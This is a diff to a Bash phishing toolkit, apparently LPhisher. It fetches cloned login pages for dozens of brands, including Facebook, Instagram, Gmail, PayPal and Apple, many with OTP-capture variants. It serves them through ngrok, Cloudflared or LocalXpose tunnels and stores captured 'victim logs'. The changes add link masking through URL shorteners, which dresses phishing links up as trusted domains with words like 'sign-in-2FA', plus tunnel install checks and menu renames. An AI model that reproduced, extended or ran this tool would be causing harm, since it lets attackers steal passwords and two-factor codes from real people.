@@ -27,6 +27,8 @@ pro_dir=$(pwd)
 server_dir="${pro_dir}/.server"
 sites_dir="${pro_dir}/.sites"
 
+#Variables
+LINK="INVALID"
 log_name=$(date +%d-%m-%Y-%H-%M-%S)
 
 #Normal Banner
@@ -164,6 +166,27 @@ else
 fi
 }
 
+#Internet check for update
+check_net_update(){
+	check_netstats
+	if [ $netstats=="Online" ]; then
+		check_update
+	else
+		echo "${RED}Your offline, Check your internet and try again."
+		sleep 5
+		mainmenu
+	fi
+}
+
+exit_internet(){
+	check_netstats
+	if [ $netstats=="Offline" ]; then
+		{ clear; banner; echo; }
+		echo -e "${REDBG}${BLACK} Check your internet connection and try again.${RESETBG}\n"
+		{ reset_color; exit 0; }
+	fi
+}
+
 #check for updates
 check_update() {
         rm -rf version.txt
@@ -181,7 +204,7 @@ check_update() {
                 echo " "
                 echo "${GREEN} Current version = ${YELLOW} $current_ver "
                 echo "${GREEN} Latest version = ${YELLOW} $lat_ver "
-                read -p "${GREEN}[${WHITE}#${GREEN}]${GREEN} Update found!! (Latest Version ${lat_ver} ) Do you want to update? (y/n) :"  ureply
+                read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Update found!! (Latest Version ${lat_ver} ) Do you want to update? (y/n) :"  ureply
                 case $ureply in
                         Y | y)
                                 update;;
@@ -226,11 +249,85 @@ update() {
 
 }
 
-## Install ngrok
-install_ngrok() {
-	if [[ -e ".server/ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+## URL MASKING
+MASKING() { #4 last one using url shortner apis
+	RESPONSE=$(wget -nv --spider https://is.gd 2>&1 | awk '{print $5}')
+	#getting response from is.gd
+	if [[ ${RESPONSE} == "200" ]];then
+		SITE=$(curl -s https://is.gd/create.php\?format\=simple\&url=${LINK})
+		if [[ ${SITE} == https://is.gd/[-0-9a-zA-Z]* ]]; then #RE-CHECKING For a valid url somtimes site goes down!!
+			MASK_SUFfix=${SITE#https://}
+		else #as a backup shortner
+			SITE=$(curl -s https://api.shrtco.de/v2/shorten?url=${LINK} >> site.log)
+			grep -o 'https:[^"]*' site.log >> bURI;rm log.URI;sed 's/\\//g' bURI >> .uri.log;rm bURI
+			MASK_SUFfix=$(grep -o '9qr.de/[-0-9a-zA-Z]*' ".uri.log")
+		fi
 	else
+		echo "${GREEN}[${WHITE}!${GREEN}]${GREEN}Erroe occured while masking try again"
+		sleep 5
+		cusurl
+	fi
+	{ clear; sbanner; }
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${ORANGE} MASKED URL : ${GREEN}${CUS_URL}-${Keystks}@${MASK_SUFfix}${GREEN}"
+}
+
+checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
+	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
+		if [[  "${1::3}" != 'www' ]]; then
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http or https insted of : ${CUS_URL}"
+			{ sleep 1.5; clear; banner; cusurl; }
+		fi
+	fi
+}
+
+cusurl(){
+	echo " "
+	echo -ne "${RED}[${WHITE}-${RED}]${ORANGE} Do You want to Customize the uRL BeLow?"
+	echo " "
+	read -p "${RED}[${WHITE}?${RED}]${ORANGE} $LINK (Y/n):${ORANGE}" CUS_URI
+	case $CUS_URI in
+                Y | y)
+			read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com):" CUS_URL
+                	checkurl ${CUS_URL}
+        	        echo " "
+	                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
+                	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
+	                        MASKING
+        	        else
+                        	echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
+                	        { sleep 1.5; clear; banner; cusurl; }
+        	        fi;;
+                N | n | *)
+                        { clear; sbanner; }
+	                echo " "
+                	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
+        	        echo " ";;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
+	                { clear; banner; cusurl; }
+                esac
+}
+
+
+## Install ngrok
+check_ngrok(){
+	if [ ! -e ".server/ngrok" ]; then
+		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Ngrok Not installed do you want to install ngrok now? (Y/n) : ${BLUE}"
+		case $REPLY in
+												Y | y)
+												install_ngrok
+												ngrok_token_check;;
+
+												N | n | *)
+																tunnelmenu;;
+
+		esac
+	else
+		ngrok_token_check
+	fi
+}
+install_ngrok() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
@@ -242,13 +339,13 @@ install_ngrok() {
 		else
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
 		fi
-	fi
 }
 
 ##Ngrok token auth
 ngrok_token_check(){
         if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
+								start_ngrok
         else
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Setting up authtoken"
                 ngrok_token_setup
@@ -275,7 +372,7 @@ ngrok_token_setup(){
                echo "authtoken : ${ntoken}" >> ngrok.yml
                mv ngrok.yml ${HOME}/.ngrok2/
         fi
-
+start_ngrok
 }
 
 ## Start ngrok
@@ -292,15 +389,27 @@ start_ngrok() {
 
         { sleep 8; clear; banner; }
         ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-        echo -e "\n ${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN} $ngrok_url"
+				LINK="${ngrok_url}"
+				cusurl
         capture_data_check
 }
 
 ## Install Cloudflared
+check_cloudflared(){
+	if [ ! -e ".server/cloudflared" ]; then
+		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Cloudflared Not installed do you want to install Cloudflared now? (Y/n) : ${BLUE}"
+		case $REPLY in
+												Y | y)
+																install_cloudflared
+																start_cloudflared;;
+
+												N | n | *)
+																tunnelmenu;;
+
+		esac
+	fi
+}
 install_cloudflared() {
-	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
-	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
@@ -312,7 +421,6 @@ install_cloudflared() {
 		else
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
 		fi
-	fi
 }
 
 ## Start Cloudflared
@@ -331,15 +439,28 @@ start_cloudflared() {
         { sleep 8; clear; banner; }
 
         cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
-        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}$cldflr_link"
+				LINK="${cldflr_link}"
+				cusurl
         capture_data_check
 }
 
 ## Install LocalXpose
+check_localxpose(){
+	if [ ! -e ".server/loclx" ]; then
+		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Localxpose Not installed do you want to install localxpose now? (Y/n) : ${BLUE}"
+		case $REPLY in
+												Y | y)
+																install_localxpose
+																token_localxpose
+																start_loclx;;
+
+												N | n | *)
+																tunnelmenu;;
+
+		esac
+	fi
+}
 install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
-	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
@@ -351,10 +472,9 @@ install_localxpose() {
 		else
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
 		fi
-	fi
 }
 
-auth_localxpose() {
+token_localxpose() {
 	./.server/loclx -help > /dev/null 2>&1 &
 	sleep 1
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
@@ -364,7 +484,7 @@ auth_localxpose() {
 		sleep 3
 		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Loclx Token :${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnelmenu
 		} || {
 			echo -n "$loclx_token" > $auth_f 2> /dev/null
 		}
@@ -374,7 +494,7 @@ auth_localxpose() {
 ## Start LocalXpose
 start_loclx() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; auth_localxpose; }
+	{ sleep 1; setup_site; token_localxpose; }
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
@@ -388,7 +508,8 @@ start_loclx() {
 
 	{ sleep 12; clear; banner; }
 	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}http://$loclx_url"
+	LINK="${loclx_url}"
+	cusurl
 	capture_data_check
 }
 
@@ -430,12 +551,26 @@ start_localhost() {
         capture_data_check
 }
 
-
-## Setup website and start php server
+#Host and port setup
 HOST='127.0.0.1'
-PORT='4444'
+cusport() {
+	echo " "
+	echo "${RED}[${WHITE}-${RED}]${GREEN}Your current port : ${BLUE}4444"
+	read -p "${RED}[${WHITE}?${RED}]${GREEN}Do you want to setup Custom port (Y/n) : ${BLUE}"
+	case $REPLY in
+	Y | y)
+		read -p "${RED}[${WHITE}?${RED}]${GREEN}Type your Custom port : ${BLUE}" cport
+		PORT="${cport}";;
+
+	N | n )
+		PORT="4444";;
+	*)
+		PORT="4444";;
+	esac
+}
 
 setup_site() {
+	exit_internet
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
 	zipfullname=$zipname".zip"
 	zipurl="https://github.com/Alygnt/phisher-modules/raw/main/csites/"$zipfullname
@@ -451,6 +586,7 @@ setup_site() {
 		cp -rf .server/www/"$website"/* .server/www
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Setup complete..."${WHITE}
                 sleep 0.2
+		cusport
 	        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
         	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 	else
@@ -666,6 +802,17 @@ capture_data_3() {
 	done
 }
 
+#online or offline stats
+netstats="Offline"
+check_netstats() {
+			wget -q --spider http://api.github.com
+			if [ $? -eq 0 ]; then
+						netstats="Online"
+			else
+						netstats="Offline"
+			fi
+}
+
 #Logs check
 logs_check() {
 	if [ -z "$(ls -A /logs)" ]; then
@@ -699,18 +846,18 @@ read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_m
 	                        { sleep 1; clear; logs_menu; }
 			fi;;
                 3 | 03)
-			read -p "${RED}[${WHITE}-${RED}]${GREEN} Do you want to clear every victim logs (Y/n) : ${BLUE}"
+			read -p "${RED}[${WHITE}?${RED}]${GREEN} Do you want to clear every victim logs (Y/n) : ${BLUE}"
 			case $REPLY in
         	                Y | y)
                 	                rm -rf logs
 					echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
-					{ sleep 1; clear; tunnel_menu; };;
+					{ sleep 1; clear; tunnelmenu; };;
                         	N | n)
                                 	{ clear;  logs_menu; };;
 
 	                esac;;
                 4 | 04)
-                        { sleep 1; clear; tunnel_menu; };;
+                        { sleep 1; clear; tunnelmenu; };;
                 *)
                         echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; clear; logs_menu; };;
@@ -718,7 +865,7 @@ read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_m
 }
 
 ## Tunnel selection
-tunnel_menu() {
+tunnelmenu() {
 { clear; banner; }
 echo -e " "
 echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
@@ -733,12 +880,14 @@ echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 min
                 1 | 01)
                         start_localhost;;
                 2 | 02)
-                        start_ngrok;;
+                        check_ngrok;;
                 3 | 03)
-                        start_cloudflared;;
+                        check_cloudflared;;
+								4 | 04)
+				                check_localxpose;;
                 *)
 0                       echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; tunnel_menu; };;
+                        { sleep 1; tunnelmenu; };;
         esac
 }
 
@@ -748,6 +897,9 @@ echo -e " "
 echo -e " "
 banner
 echo -e " "
+echo -e " "
+exit_internet
+echo "${GREEN}Network Status ${NC}= ${RED}$netstats"
 echo -e " "
 echo -e "${RED} CHOOSE A SITE : ${NC}"
 echo -e " "
@@ -790,7 +942,7 @@ case $reply in
         2 | 02)
 		zipname="airtelsim"
                 website="airtelsim"
-		tunnel_menu;;
+		tunnelmenu;;
 	3 | 03)
 		zipname="airtelxstream"
                 site_airtelxstream;;
@@ -809,7 +961,7 @@ case $reply in
         8 | 08)
 		zipname="clashofclans"
                 website="clashofclans"
-		tunnel_menu;;
+		tunnelmenu;;
 	9 | 09)
                 site_date;;
         10)
@@ -818,7 +970,7 @@ case $reply in
 	11)
 		zipname="dropbox"
                 website="dropbox"
-                tunnel_menu;;
+                tunnelmenu;;
 	12)
 		zipname="ebay"
                 site_ebay;;
@@ -830,7 +982,7 @@ case $reply in
 	15)
 		zipname="freefire"
                 website="freefire"
-                tunnel_menu;;
+                tunnelmenu;;
         16)
                 site_github;;
 	17)
@@ -846,13 +998,13 @@ case $reply in
 	21)
 		zipname="icloud"
                 website="icloud"
-                tunnel_menu;;
+                tunnelmenu;;
 	22)
                 site_instagram;;
 	23)
 		zipname="jazz"
                 website="jazz"
-                tunnel_menu;;
+                tunnelmenu;;
         24)
                 site_jio;;
         25)
@@ -869,7 +1021,7 @@ case $reply in
 	29)
 		zipname="mobiwik"
                 website="mobikwik"
-                tunnel_menu;;
+                tunnelmenu;;
 	30)
 		zipname="myspace"
                 site_myspace;;
@@ -879,11 +1031,11 @@ case $reply in
 	32)
 		zipname="ola"
                 website="ola"
-                tunnel_menu;;
+                tunnelmenu;;
 	33)
 		zipname="origin"
                 website="origin"
-                tunnel_menu;;
+                tunnelmenu;;
 	34)
 		zipname="paypal"
                 site_paypal;;
@@ -892,11 +1044,11 @@ case $reply in
 	36)
 		zipname="phonepay"
                 website="phonepay"
-                tunnel_menu;;
+                tunnelmenu;;
 	37)
 		zipname="pinterest"
                 website="pinterest"
-                tunnel_menu;;
+                tunnelmenu;;
 	38)
 		site_playstation;;
 	39)
@@ -905,11 +1057,11 @@ case $reply in
 	40)
 		zipname="pubg"
                 website="pubg"
-                tunnel_menu;;
+                tunnelmenu;;
 	41)
 		zipname="quora"
                 website="quora"
-                tunnel_menu;;
+                tunnelmenu;;
 	42)
                 site_reddit;;
 	43)
@@ -933,15 +1085,15 @@ case $reply in
 	49)
 		zipname="subitoit"
                 website="subitoit"
-                tunnel_menu;;
+                tunnelmenu;;
 	50)
 		zipname="telegram"
                 website="telegram"
-                tunnel_menu;;
+                tunnelmenu;;
 	51)
 		zipname="telenor"
                 website="telenor"
-                tunnel_menu;;
+                tunnelmenu;;
 	52)
                 site_tiktok;;
         53)
@@ -958,13 +1110,13 @@ case $reply in
         57)
 		zipname="visim"
                 website="visim"
-                tunnel_menu;;
+                tunnelmenu;;
 	58)
                 site_vk;;
         59)
 		zipname="whatsapp"
                 website="whatsapp"
-                tunnel_menu;;
+                tunnelmenu;;
 	60)
 		zipname="wordpress"
                 site_wordpress;;
@@ -989,11 +1141,11 @@ case $reply in
 	67)
 		zipname="google_wifi"
 		website="google_wifi"
-		tunnel_menu;;
+		tunnelmenu;;
 	68)
 		zipname="pattern"
 		website="pattern"
-		tunnel_menu;;
+		tunnelmenu;;
 	A | a)
 		xdg-open https://github.com/Alygnt/LPhisher
                 { sleep 2; clear;  banner; mainmenu; };;
@@ -1027,10 +1179,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
 	1 | 01)
 		website="adobe"
-		tunnel_menu;;
+		tunnelmenu;;
 	2 | 02)
                 website="adobe/otp"
-                tunnel_menu;;
+                tunnelmenu;;
 	*)
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_adobe; };;
@@ -1046,10 +1198,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="airtelxstream"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="airtelxstream/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_airtelxstream; };;
@@ -1065,10 +1217,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="ajio"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="ajio/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_ajio; };;
@@ -1084,10 +1236,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="amazon"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="amazon/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_amazon; };;
@@ -1103,10 +1255,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="apple"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="apple/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_apple; };;
@@ -1122,10 +1274,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="badoo"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="badoo/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_badoo; };;
@@ -1144,19 +1296,19 @@ case $choice in
         1 | 01)
 		zipname="date1"
                 website="date1"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
 		zipname="date1"
                 website="date1/otp"
-                tunnel_menu;;
+                tunnelmenu;;
 	3 | 03)
 		zipname="date2"
                 website="date2"
-                tunnel_menu;;
+                tunnelmenu;;
         4 | 04)
 		zipname="date2"
                 website="date2/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_date; };;
@@ -1172,10 +1324,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="devianart"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="devianart"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_airtelxstream; };;
@@ -1191,10 +1343,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="ebay"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="ebay/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_ebay; };;
@@ -1216,31 +1368,31 @@ case $choice in
         1 | 01)
                 website="facebook"
 	        zipname="facebook"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="facebook/otp"
 		zipname="facebook"
-                tunnel_menu;;
+                tunnelmenu;;
 	3 | 03)
                 website="fb_poll"
 		zipname="fb_poll"
-                tunnel_menu;;
+                tunnelmenu;;
         4 | 04)
                 website="fb_poll/otp"
 		zipname="fb_poll"
-                tunnel_menu;;
+                tunnelmenu;;
 	5 | 05)
                 website="fb_security"
 		zipname="fb_security"
-                tunnel_menu;;
+                tunnelmenu;;
         6 | 06)
                 website="fb_security/otp"
 		zipname="fb_security"
-                tunnel_menu;;
+                tunnelmenu;;
 	7 | 07)
                 website="fb_standard"
 		zipname="fb_standard"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_facebook; };;
@@ -1256,10 +1408,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="flipcart"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="flipcart/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_flipcart; };;
@@ -1278,19 +1430,19 @@ case $choice in
         1 | 01)
                 website="github"
 		zipname="github"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="github/otp"
 		zipname="github"
-                tunnel_menu;;
+                tunnelmenu;;
 	3 | 03)
                 website="github_advanced"
 		zipname="github_advanced"
-                tunnel_menu;;
+                tunnelmenu;;
         4 | 04)
                 website="github_advanced/otp"
 		zipname="github_advanced"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_github; };;
@@ -1309,19 +1461,19 @@ case $choice in
 	1 | 01)
                 website="gitlab"
 		zipname="gitlab"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="gitlab/otp"
 		zipname="gitlab"
-                tunnel_menu;;
+                tunnelmenu;;
         3 | 03)
                 website="gitlab_advanced"
 		zipname="gitlab_advanced"
-                tunnel_menu;;
+                tunnelmenu;;
         4 | 04)
                 website="gitlab_advanced/otp"
 		zipname="gitlab_advanced"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_gitlab; };;
@@ -1337,10 +1489,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="gmail"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="gmail/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_gmail; };;
@@ -1361,27 +1513,27 @@ case $choice in
         1 | 01)
                 website="google_new"
 		zipname="google_new"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="google_new/otp"
 		zipname="google_new"
-                tunnel_menu;;
+                tunnelmenu;;
         3 | 03)
                 website="google_poll"
 		zipname="google_poll"
-                tunnel_menu;;
+                tunnelmenu;;
         4 | 04)
                 website="google_poll/otp"
 		zipname="google_poll"
-                tunnel_menu;;
+                tunnelmenu;;
         5 | 05)
                 website="google"
 		zipname="google"
-                tunnel_menu;;
+                tunnelmenu;;
 	6 | 06)
 		website="google/otp"
 		zipname="google"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_google; };;
@@ -1397,10 +1549,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="gpay"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="gpay/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_gpay; };;
@@ -1419,6 +1571,7 @@ echo -e "${BLUE}[08]${CYAN} Instagram Followers - WITH OTP ${NC}"
 echo -e "${BLUE}[09]${CYAN} Instagram Verify - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
+echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC
 echo -e " ${NC}"
 read -p "${MAGENTA} YOUR CHOICE : " choice
 
@@ -1426,47 +1579,51 @@ case $choice in
         1 | 01)
                 website="instagram"
 		zipname="instagram"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="instagram/otp"
 		zipname="instagram"
-                tunnel_menu;;
+                tunnelmenu;;
         3 | 03)
                 website="ig_advanced"
 		zipname="ig_advanced"
-                tunnel_menu;;
+                tunnelmenu;;
         4 | 04)
                 website="ig_advanced/otp"
 		zipname="ig_advanced"
-                tunnel_menu;;
+                tunnelmenu;;
         5 | 05)
                 website="ig_autoliker"
 		zipname="ig_autoliker"
-                tunnel_menu;;
+                tunnelmenu;;
         6 | 06)
                 website="ig_autoliker/otp"
 		zipname="ig_autoliker"
-                tunnel_menu;;
+                tunnelmenu;;
         7 | 07)
                 website="ig_followers"
 		zipname="ig_followers"
-                tunnel_menu;;
+                tunnelmenu;;
 	8 | 08)
                 website="ig_followers/otp"
 		zipname="ig_followers"
-                tunnel_menu;;
+                tunnelmenu;;
 	9 | 09)
                 website="ig_verify"
 		zipname="ig_verify"
-                tunnel_menu;;
+                tunnelmenu;;
 	10)
                 website="ig_old"
 		zipname="ig_old"
-                tunnel_menu;;
+                tunnelmenu;;
         11)
                 website="ig_old/otp"
 		zipname="ig_old"
-                tunnel_menu;;
+                tunnelmenu;;
+				12)
+								website="ig_video"
+								zipname="ig_video"
+								tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_instagram; };;
@@ -1483,11 +1640,11 @@ case $choice in
         1 | 01)
                 website="jiosim"
 		zipname="jiosim"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="jiooffer"
 		zipname="jiooffer"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_jio; };;
@@ -1503,10 +1660,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="linkedin"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="linkedin/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_linkedin; };;
@@ -1522,10 +1679,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="mediafire"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="mediafire/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_mediafire; };;
@@ -1544,19 +1701,19 @@ case $choice in
         1 | 01)
                 website="messenger"
 		zipname="messenger"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="messenger/otp"
 		zipname="messenger"
-                tunnel_menu;;
+                tunnelmenu;;
         3 | 03)
                 website="messenger_old"
 		zipname="messenger_old"
-                tunnel_menu;;
+                tunnelmenu;;
         4 | 04)
                 website="messenger_old/otp"
 		zipname="messenger_old"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_messenger; };;
@@ -1572,10 +1729,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="microsoft"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="microsoft/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
